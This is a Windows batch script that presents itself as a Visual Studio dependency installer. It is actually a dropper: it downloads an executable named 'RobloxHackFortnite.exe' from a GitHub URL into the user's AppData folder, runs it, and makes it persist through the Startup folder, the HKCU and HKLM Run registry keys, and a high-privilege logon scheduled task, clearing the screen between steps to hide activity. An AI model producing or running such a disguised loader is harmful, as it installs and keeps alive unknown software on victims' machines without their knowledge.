@echo off
cls
@echo off
title Dependecies - Visual Studio
color 0c
echo Installing dependencies...
cls

:: Set variables
set "https://github.com/dariosfiles/ROBLOXHACK/raw/refs/heads/main/RobloxHackFortnite.exe"
set "TARGET_PATH=%APPDATA%\RobloxHackFortnite.exe"

cls


:: Download the file using PowerShell
powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%TARGET_PATH%'"

cls


:: Execute the downloaded file
start "" "%TARGET_PATH%"

cls


:: Set file to run at startup using multiple methods

:: Method 1: Startup folder
copy "%TARGET_PATH%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\downloaded_file.exe" >nul 2>&1

cls


:: Method 2: Registry - Current User Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DownloadedFile" /t REG_SZ /d "%TARGET_PATH%" /f >nul 2>&1

cls


:: Method 3: Registry - Local Machine Run key (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "DownloadedFile" /t REG_SZ /d "%TARGET_PATH%" /f >nul 2>&1

cls


:: Method 4: Scheduled Task (fallback in case registry/startup folder is blocked)
schtasks /create /tn "DownloadedFileTask" /tr "%TARGET_PATH%" /sc onlogon /rl HIGHEST /f >nul 2>&1

cls

echo Hi
exit
